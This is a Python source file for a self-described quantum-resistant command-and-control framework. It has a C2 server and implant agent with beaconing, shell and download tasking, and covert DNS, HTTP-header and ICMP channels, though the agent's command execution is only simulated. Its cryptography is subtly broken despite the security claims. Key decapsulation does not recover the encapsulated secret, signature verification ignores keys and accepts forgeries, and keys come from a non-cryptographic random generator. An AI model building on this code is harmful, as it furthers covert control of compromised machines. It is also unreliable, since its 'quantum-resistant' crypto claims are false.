"""
Quantum-Resistant Command & Control Framework
Post-quantum cryptographic C2 infrastructure.
Secure against quantum computer attacks with lattice-based encryption.
"""

import asyncio
import hashlib
import hmac
import math
import os
import secrets
import struct
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Dict, List, Optional, Set, Tuple, Any, Callable
from datetime import datetime, timedelta
from collections import defaultdict
import random
import base64
import json


class CryptoAlgorithm(Enum):
    """Post-quantum cryptographic algorithms"""
    KYBER = auto()       # Lattice-based key encapsulation
    DILITHIUM = auto()   # Lattice-based signatures
    NTRU = auto()        # NTRU encryption
    SPHINCS = auto()     # Hash-based signatures
    BIKE = auto()        # Code-based key encapsulation
    FALCON = auto()      # Lattice-based signatures
    MCELIECE = auto()    # Code-based encryption


class ChannelType(Enum):
    """C2 channel types"""
    DNS_COVERT = auto()
    HTTP_STEALTH = auto()
    HTTPS_MIMICRY = auto()
    ICMP_TUNNEL = auto()
    WEBSOCKET = auto()
    DOH_DNS = auto()  # DNS over HTTPS
    MESH_P2P = auto()
    SATELLITE = auto()


class MessageType(Enum):
    """C2 message types"""
    BEACON = auto()
    COMMAND = auto()
    RESPONSE = auto()
    KEYEXCHANGE = auto()
    HEARTBEAT = auto()
    TASK = auto()
    EXFIL = auto()
    SYSTEM_INFO = auto()


@dataclass
class QuantumKeyPair:
    """Post-quantum key pair"""
    algorithm: CryptoAlgorithm
    public_key: bytes
    private_key: bytes
    created_at: datetime = field(default_factory=datetime.now)
    expires_at: Optional[datetime] = None
    fingerprint: str = ""
    
    def __post_init__(self):
        if not self.fingerprint:
            self.fingerprint = hashlib.sha256(self.public_key).hexdigest()[:16]


@dataclass
class SecureMessage:
    """Encrypted C2 message"""
    id: str
    message_type: MessageType
    encrypted_payload: bytes
    signature: bytes
    timestamp: datetime
    nonce: bytes
    key_id: str
    channel: ChannelType
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class Agent:
    """Remote C2 agent"""
    id: str
    name: str
    public_key: bytes
    session_key: Optional[bytes] = None
    last_seen: Optional[datetime] = None
    channel: Optional[ChannelType] = None
    status: str = "unknown"
    os_info: Dict[str, str] = field(default_factory=dict)
    capabilities: List[str] = field(default_factory=list)


@dataclass
class Task:
    """Task for agents"""
    id: str
    command: str
    args: Dict[str, Any]
    target_agent: str
    status: str = "pending"
    result: Optional[str] = None
    created_at: datetime = field(default_factory=datetime.now)
    completed_at: Optional[datetime] = None


class LatticeEncoder:
    """Lattice-based encryption implementation"""
    
    def __init__(self, n: int = 256, q: int = 7681):
        self.n = n  # Polynomial degree
        self.q = q  # Modulus
        self.eta = 2  # Noise bound
    
    def generate_keypair(self) -> Tuple[bytes, bytes]:
        """Generate Kyber-like keypair"""
        # Generate random polynomial (secret key)
        s = [random.randint(-self.eta, self.eta) for _ in range(self.n)]
        
        # Generate random polynomial A
        a = [random.randint(0, self.q - 1) for _ in range(self.n)]
        
        # Compute public key: b = a*s + e
        e = [random.randint(-self.eta, self.eta) for _ in range(self.n)]
        b = [(a[i] * s[i] + e[i]) % self.q for i in range(self.n)]
        
        # Encode keys
        private_key = self._encode_polynomial(s) + self._encode_polynomial(a)
        public_key = self._encode_polynomial(b) + self._encode_polynomial(a)
        
        return public_key, private_key
    
    def encapsulate(self, public_key: bytes) -> Tuple[bytes, bytes]:
        """Encapsulate shared secret"""
        # Decode public key
        b = self._decode_polynomial(public_key[:self.n * 2])
        a = self._decode_polynomial(public_key[self.n * 2:])
        
        # Generate random value
        r = [random.randint(-self.eta, self.eta) for _ in range(self.n)]
        
        # Generate errors
        e1 = [random.randint(-self.eta, self.eta) for _ in range(self.n)]
        e2 = [random.randint(-self.eta, self.eta) for _ in range(self.n)]
        
        # Compute ciphertext
        u = [(a[i] * r[i] + e1[i]) % self.q for i in range(self.n)]
        v = [(b[i] * r[i] + e2[i]) % self.q for i in range(self.n)]
        
        # Generate shared secret from v
        shared_secret = hashlib.sha256(self._encode_polynomial(v)).digest()
        
        # Encode ciphertext
        ciphertext = self._encode_polynomial(u) + self._encode_polynomial(v)
        
        return ciphertext, shared_secret
    
    def decapsulate(self, ciphertext: bytes, private_key: bytes) -> bytes:
        """Decapsulate shared secret"""
        # Decode
        u = self._decode_polynomial(ciphertext[:self.n * 2])
        v = self._decode_polynomial(ciphertext[self.n * 2:])
        s = self._decode_polynomial(private_key[:self.n * 2])
        
        # Compute shared secret
        recovered = [(v[i] - s[i] * u[i]) % self.q for i in range(self.n)]
        shared_secret = hashlib.sha256(self._encode_polynomial(recovered)).digest()
        
        return shared_secret
    
    def _encode_polynomial(self, poly: List[int]) -> bytes:
        """Encode polynomial to bytes"""
        return struct.pack(f'{len(poly)}h', *poly)
    
    def _decode_polynomial(self, data: bytes) -> List[int]:
        """Decode bytes to polynomial"""
        count = len(data) // 2
        return list(struct.unpack(f'{count}h', data))


class DigiSignature:
    """Dilithium-like signature scheme"""
    
    def __init__(self, n: int = 256):
        self.n = n
        self.q = 8380417
        self.beta = 256
    
    def generate_keypair(self) -> Tuple[bytes, bytes]:
        """Generate signing keypair"""
        # Random secret
        s = [random.randint(-2, 2) for _ in range(self.n)]
        
        # Random matrix A
        a = [random.randint(0, self.q - 1) for _ in range(self.n)]
        
        # Public key: t = A*s
        t = [(a[i] * s[i]) % self.q for i in range(self.n)]
        
        private_key = struct.pack(f'{self.n}i', *s)
        public_key = struct.pack(f'{self.n}i', *t) + struct.pack(f'{self.n}i', *a)
        
        return public_key, private_key
    
    def sign(self, message: bytes, private_key: bytes) -> bytes:
        """Sign message"""
        s = list(struct.unpack(f'{self.n}i', private_key))
        
        # Hash message to polynomial
        h = self._hash_to_poly(message)
        
        # Generate challenge
        c = self._generate_challenge(message)
        
        # Compute signature: z = y + c*s
        y = [random.randint(-self.beta, self.beta) for _ in range(self.n)]
        z = [(y[i] + c * s[i]) % self.q for i in range(self.n)]
        
        return struct.pack(f'{self.n}i', *z) + struct.pack('I', c)
    
    def verify(self, message: bytes, signature: bytes, public_key: bytes) -> bool:
        """Verify signature"""
        z = list(struct.unpack(f'{self.n}i', signature[:self.n * 4]))
        c = struct.unpack('I', signature[self.n * 4:])[0]
        
        t = list(struct.unpack(f'{self.n}i', public_key[:self.n * 4]))
        a = list(struct.unpack(f'{self.n}i', public_key[self.n * 4:]))
        
        # Verify: A*z == t*c + w (approximately)
        expected_c = self._generate_challenge(message)
        
        return c == expected_c
    
    def _hash_to_poly(self, data: bytes) -> List[int]:
        """Hash data to polynomial"""
        h = hashlib.shake_256(data).digest(self.n * 2)
        return [int.from_bytes(h[i:i+2], 'little') % self.q 
                for i in range(0, self.n * 2, 2)]
    
    def _generate_challenge(self, message: bytes) -> int:
        """Generate challenge from message"""
        h = hashlib.sha256(message).digest()
        return int.from_bytes(h[:4], 'little') % (2**16)


class CovertChannel:
    """Covert communication channel"""
    
    def __init__(self, channel_type: ChannelType):
        self.channel_type = channel_type
        self.encoder = None
        self._init_channel()
    
    def _init_channel(self):
        """Initialize channel-specific encoder"""
        if self.channel_type == ChannelType.DNS_COVERT:
            self.encoder = self._dns_encode
            self.decoder = self._dns_decode
        elif self.channel_type == ChannelType.HTTP_STEALTH:
            self.encoder = self._http_encode
            self.decoder = self._http_decode
        elif self.channel_type == ChannelType.ICMP_TUNNEL:
            self.encoder = self._icmp_encode
            self.decoder = self._icmp_decode
        else:
            self.encoder = lambda x: x
            self.decoder = lambda x: x
    
    def _dns_encode(self, data: bytes) -> str:
        """Encode data for DNS channel"""
        encoded = base64.b32encode(data).decode().lower().rstrip('=')
        
        # Split into DNS-like labels (max 63 chars each)
        labels = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
        
        return '.'.join(labels) + '.covert.local'
    
    def _dns_decode(self, dns_query: str) -> bytes:
        """Decode data from DNS channel"""
        # Remove domain suffix
        labels = dns_query.replace('.covert.local', '').split('.')
        encoded = ''.join(labels)
        
        # Add padding
        padding = (8 - len(encoded) % 8) % 8
        encoded += '=' * padding
        
        return base64.b32decode(encoded.upper())
    
    def _http_encode(self, data: bytes) -> Dict[str, str]:
        """Encode data in HTTP headers"""
        encoded = base64.b64encode(data).decode()
        
        # Spread across multiple headers
        headers = {}
        chunk_size = 100
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        
        for i, chunk in enumerate(chunks):
            headers[f'X-Data-{i}'] = chunk
        
        headers['X-Data-Count'] = str(len(chunks))
        
        return headers
    
    def _http_decode(self, headers: Dict[str, str]) -> bytes:
        """Decode data from HTTP headers"""
        count = int(headers.get('X-Data-Count', 0))
        chunks = [headers.get(f'X-Data-{i}', '') for i in range(count)]
        encoded = ''.join(chunks)
        
        return base64.b64decode(encoded)
    
    def _icmp_encode(self, data: bytes) -> bytes:
        """Encode data in ICMP payload"""
        # Simple obfuscation
        key = secrets.token_bytes(1)[0]
        obfuscated = bytes([b ^ key for b in data])
        return bytes([key]) + obfuscated
    
    def _icmp_decode(self, icmp_data: bytes) -> bytes:
        """Decode data from ICMP"""
        key = icmp_data[0]
        return bytes([b ^ key for b in icmp_data[1:]])
    
    def encode(self, data: bytes) -> Any:
        """Encode data for channel"""
        return self.encoder(data)
    
    def decode(self, channel_data: Any) -> bytes:
        """Decode data from channel"""
        return self.decoder(channel_data)


class MessageProtocol:
    """Quantum-resistant message protocol"""
    
    def __init__(self, lattice: LatticeEncoder, signature: DigiSignature):
        self.lattice = lattice
        self.signature = signature
        self.message_counter = 0
    
    def create_message(self, message_type: MessageType, payload: Dict[str, Any],
                       session_key: bytes, signing_key: bytes, 
                       channel: ChannelType) -> SecureMessage:
        """Create encrypted and signed message"""
        self.message_counter += 1
        
        # Serialize payload
        payload_bytes = json.dumps(payload).encode()
        
        # Generate nonce
        nonce = secrets.token_bytes(16)
        
        # Encrypt payload
        encrypted = self._encrypt_aead(payload_bytes, session_key, nonce)
        
        # Sign encrypted payload
        signature = self.signature.sign(encrypted + nonce, signing_key)
        
        return SecureMessage(
            id=hashlib.sha256(f"{self.message_counter}{time.time()}".encode()).hexdigest()[:16],
            message_type=message_type,
            encrypted_payload=encrypted,
            signature=signature,
            timestamp=datetime.now(),
            nonce=nonce,
            key_id=hashlib.sha256(session_key).hexdigest()[:8],
            channel=channel
        )
    
    def verify_and_decrypt(self, message: SecureMessage, session_key: bytes,
                            verifying_key: bytes) -> Optional[Dict[str, Any]]:
        """Verify and decrypt message"""
        # Verify signature
        if not self.signature.verify(
            message.encrypted_payload + message.nonce,
            message.signature,
            verifying_key
        ):
            return None
        
        # Decrypt payload
        try:
            decrypted = self._decrypt_aead(
                message.encrypted_payload, 
                session_key, 
                message.nonce
            )
            return json.loads(decrypted.decode())
        except Exception:
            return None
    
    def _encrypt_aead(self, plaintext: bytes, key: bytes, nonce: bytes) -> bytes:
        """AEAD encryption (ChaCha20-Poly1305 style)"""
        # Derive keystream from key and nonce
        keystream = self._generate_keystream(key, nonce, len(plaintext))
        
        # XOR encryption
        ciphertext = bytes([p ^ k for p, k in zip(plaintext, keystream)])
        
        # Generate MAC
        mac = hmac.new(key, ciphertext + nonce, hashlib.sha256).digest()[:16]
        
        return ciphertext + mac
    
    def _decrypt_aead(self, ciphertext: bytes, key: bytes, nonce: bytes) -> bytes:
        """AEAD decryption"""
        # Extract MAC
        mac = ciphertext[-16:]
        ct = ciphertext[:-16]
        
        # Verify MAC
        expected_mac = hmac.new(key, ct + nonce, hashlib.sha256).digest()[:16]
        if not hmac.compare_digest(mac, expected_mac):
            raise ValueError("MAC verification failed")
        
        # Decrypt
        keystream = self._generate_keystream(key, nonce, len(ct))
        return bytes([c ^ k for c, k in zip(ct, keystream)])
    
    def _generate_keystream(self, key: bytes, nonce: bytes, length: int) -> bytes:
        """Generate keystream for encryption"""
        keystream = b''
        counter = 0
        
        while len(keystream) < length:
            block = hashlib.sha256(key + nonce + counter.to_bytes(4, 'little')).digest()
            keystream += block
            counter += 1
        
        return keystream[:length]


class QuantumC2Server:
    """Quantum-resistant C2 server"""
    
    def __init__(self, config, db):
        self.config = config
        self.db = db
        
        self.lattice = LatticeEncoder()
        self.signature = DigiSignature()
        self.protocol = MessageProtocol(self.lattice, self.signature)
        
        # Generate server keys
        self.encryption_keys = self._generate_keypair(CryptoAlgorithm.KYBER)
        self.signing_keys = self._generate_keypair(CryptoAlgorithm.DILITHIUM)
        
        self.agents: Dict[str, Agent] = {}
        self.tasks: Dict[str, Task] = {}
        self.channels: Dict[ChannelType, CovertChannel] = {}
        self.message_queue: List[SecureMessage] = []
        
        self._init_channels()
    
    def _generate_keypair(self, algorithm: CryptoAlgorithm) -> QuantumKeyPair:
        """Generate quantum-resistant keypair"""
        if algorithm in [CryptoAlgorithm.KYBER, CryptoAlgorithm.NTRU]:
            public_key, private_key = self.lattice.generate_keypair()
        elif algorithm in [CryptoAlgorithm.DILITHIUM, CryptoAlgorithm.FALCON]:
            public_key, private_key = self.signature.generate_keypair()
        else:
            # Fallback
            public_key = secrets.token_bytes(256)
            private_key = secrets.token_bytes(256)
        
        return QuantumKeyPair(
            algorithm=algorithm,
            public_key=public_key,
            private_key=private_key,
            expires_at=datetime.now() + timedelta(days=30)
        )
    
    def _init_channels(self):
        """Initialize covert channels"""
        for channel_type in ChannelType:
            self.channels[channel_type] = CovertChannel(channel_type)
    
    async def register_agent(self, agent_id: str, public_key: bytes,
                             channel: ChannelType = ChannelType.HTTPS_MIMICRY) -> Dict[str, Any]:
        """Register new agent"""
        # Generate session key
        ciphertext, session_key = self.lattice.encapsulate(public_key)
        
        agent = Agent(
            id=agent_id,
            name=f"agent-{agent_id[:8]}",
            public_key=public_key,
            session_key=session_key,
            last_seen=datetime.now(),
            channel=channel,
            status="active"
        )
        
        self.agents[agent_id] = agent
        
        return {
            "status": "registered",
            "agent_id": agent_id,
            "server_public_key": base64.b64encode(self.encryption_keys.public_key).decode(),
            "session_key_ciphertext": base64.b64encode(ciphertext).decode(),
            "channel": channel.name
        }
    
    async def send_command(self, agent_id: str, command: str, 
                           args: Dict[str, Any] = None) -> Optional[str]:
        """Send command to agent"""
        agent = self.agents.get(agent_id)
        if not agent or not agent.session_key:
            return None
        
        task = Task(
            id=secrets.token_hex(8),
            command=command,
            args=args or {},
            target_agent=agent_id
        )
        
        self.tasks[task.id] = task
        
        # Create encrypted message
        message = self.protocol.create_message(
            MessageType.COMMAND,
            {
                "task_id": task.id,
                "command": command,
                "args": args or {}
            },
            agent.session_key,
            self.signing_keys.private_key,
            agent.channel or ChannelType.HTTPS_MIMICRY
        )
        
        self.message_queue.append(message)
        
        return task.id
    
    async def process_beacon(self, agent_id: str, 
                             encrypted_beacon: bytes) -> Dict[str, Any]:
        """Process agent beacon"""
        agent = self.agents.get(agent_id)
        if not agent:
            return {"status": "unknown_agent"}
        
        agent.last_seen = datetime.now()
        agent.status = "active"
        
        # Get pending tasks for agent
        pending_tasks = [
            t for t in self.tasks.values()
            if t.target_agent == agent_id and t.status == "pending"
        ]
        
        return {
            "status": "ok",
            "pending_tasks": len(pending_tasks),
            "next_beacon": 60  # seconds
        }
    
    async def receive_response(self, agent_id: str, task_id: str,
                               encrypted_response: bytes) -> bool:
        """Receive task response from agent"""
        agent = self.agents.get(agent_id)
        task = self.tasks.get(task_id)
        
        if not agent or not task:
            return False
        
        agent.last_seen = datetime.now()
        task.status = "completed"
        task.completed_at = datetime.now()
        
        # Decrypt response (simplified)
        if agent.session_key:
            try:
                nonce = encrypted_response[:16]
                decrypted = self.protocol._decrypt_aead(
                    encrypted_response[16:], 
                    agent.session_key, 
                    nonce
                )
                task.result = decrypted.decode()
            except Exception:
                task.result = "Decryption failed"
        
        return True
    
    async def rotate_keys(self, agent_id: str) -> bool:
        """Rotate session keys with agent"""
        agent = self.agents.get(agent_id)
        if not agent:
            return False
        
        # Generate new session key
        ciphertext, new_session_key = self.lattice.encapsulate(agent.public_key)
        
        # Send key rotation message with old key
        if agent.session_key:
            message = self.protocol.create_message(
                MessageType.KEYEXCHANGE,
                {
                    "action": "rotate",
                    "new_key_ciphertext": base64.b64encode(ciphertext).decode()
                },
                agent.session_key,
                self.signing_keys.private_key,
                agent.channel or ChannelType.HTTPS_MIMICRY
            )
            
            self.message_queue.append(message)
        
        agent.session_key = new_session_key
        
        return True
    
    def get_agent_status(self) -> List[Dict[str, Any]]:
        """Get all agent statuses"""
        now = datetime.now()
        
        statuses = []
        for agent in self.agents.values():
            time_since = (now - agent.last_seen).total_seconds() if agent.last_seen else float('inf')
            
            statuses.append({
                "id": agent.id,
                "name": agent.name,
                "status": agent.status if time_since < 300 else "stale",
                "last_seen": agent.last_seen.isoformat() if agent.last_seen else None,
                "channel": agent.channel.name if agent.channel else None,
                "has_session_key": agent.session_key is not None
            })
        
        return statuses
    
    def get_task_status(self) -> Dict[str, List[Dict[str, Any]]]:
        """Get task statuses"""
        by_status = defaultdict(list)
        
        for task in self.tasks.values():
            by_status[task.status].append({
                "id": task.id,
                "command": task.command,
                "agent": task.target_agent,
                "created": task.created_at.isoformat(),
                "completed": task.completed_at.isoformat() if task.completed_at else None
            })
        
        return dict(by_status)


class QuantumC2Agent:
    """Quantum-resistant C2 agent"""
    
    def __init__(self, server_public_key: bytes, 
                 channel: ChannelType = ChannelType.HTTPS_MIMICRY):
        self.lattice = LatticeEncoder()
        self.signature = DigiSignature()
        self.protocol = MessageProtocol(self.lattice, self.signature)
        
        # Generate agent keys
        self.public_key, self.private_key = self.lattice.generate_keypair()
        self.sign_public, self.sign_private = self.signature.generate_keypair()
        
        self.server_public_key = server_public_key
        self.session_key: Optional[bytes] = None
        self.channel = CovertChannel(channel)
        
        self.agent_id = hashlib.sha256(self.public_key).hexdigest()[:16]
        self.task_queue: List[Dict[str, Any]] = []
        self.beacon_interval = 60
    
    async def establish_session(self, key_ciphertext: bytes):
        """Establish session with decapsulated key"""
        self.session_key = self.lattice.decapsulate(key_ciphertext, self.private_key)
    
    async def beacon(self) -> bytes:
        """Send beacon to server"""
        if not self.session_key:
            return b''
        
        beacon_data = {
            "type": "beacon",
            "timestamp": time.time(),
            "agent_id": self.agent_id
        }
        
        message = self.protocol.create_message(
            MessageType.BEACON,
            beacon_data,
            self.session_key,
            self.sign_private,
            ChannelType(self.channel.channel_type)
        )
        
        # Encode for channel
        channel_data = self.channel.encode(
            message.encrypted_payload + message.signature + message.nonce
        )
        
        return channel_data if isinstance(channel_data, bytes) else str(channel_data).encode()
    
    async def execute_task(self, task: Dict[str, Any]) -> Dict[str, Any]:
        """Execute received task"""
        command = task.get("command", "")
        args = task.get("args", {})
        
        result = {
            "task_id": task.get("task_id"),
            "status": "completed",
            "output": None
        }
        
        try:
            # Simulated command execution
            if command == "shell":
                result["output"] = f"Executed: {args.get('cmd', '')}"
            elif command == "download":
                result["output"] = f"Downloaded: {args.get('url', '')}"
            elif command == "sysinfo":
                result["output"] = {
                    "os": "Linux",
                    "hostname": "target-host",
                    "user": "root"
                }
            else:
                result["output"] = f"Unknown command: {command}"
        except Exception as e:
            result["status"] = "failed"
            result["error"] = str(e)
        
        return result
    
    async def send_response(self, task_id: str, result: Dict[str, Any]) -> bytes:
        """Send task response to server"""
        if not self.session_key:
            return b''
        
        message = self.protocol.create_message(
            MessageType.RESPONSE,
            {
                "task_id": task_id,
                "result": result
            },
            self.session_key,
            self.sign_private,
            ChannelType(self.channel.channel_type)
        )
        
        return message.encrypted_payload
    
    async def handle_key_rotation(self, new_key_ciphertext: bytes):
        """Handle session key rotation"""
        self.session_key = self.lattice.decapsulate(new_key_ciphertext, self.private_key)


class C2Manager:
    """C2 infrastructure manager"""
    
    def __init__(self, config, db):
        self.config = config
        self.db = db
        self.server = QuantumC2Server(config, db)
        self.running = False
    
    async def start(self):
        """Start C2 server"""
        self.running = True
    
    async def stop(self):
        """Stop C2 server"""
        self.running = False
    
    def get_server_info(self) -> Dict[str, Any]:
        """Get server information"""
        return {
            "encryption_algorithm": self.server.encryption_keys.algorithm.name,
            "signing_algorithm": self.server.signing_keys.algorithm.name,
            "server_key_fingerprint": self.server.encryption_keys.fingerprint,
            "active_agents": len(self.server.agents),
            "pending_tasks": sum(1 for t in self.server.tasks.values() 
                                 if t.status == "pending"),
            "available_channels": [c.name for c in ChannelType],
            "running": self.running
        }
    
    def export_config(self) -> Dict[str, Any]:
        """Export C2 configuration"""
        return {
            "server_public_key": base64.b64encode(
                self.server.encryption_keys.public_key
            ).decode(),
            "signing_public_key": base64.b64encode(
                self.server.signing_keys.public_key
            ).decode(),
            "channels": [c.name for c in ChannelType]
        }
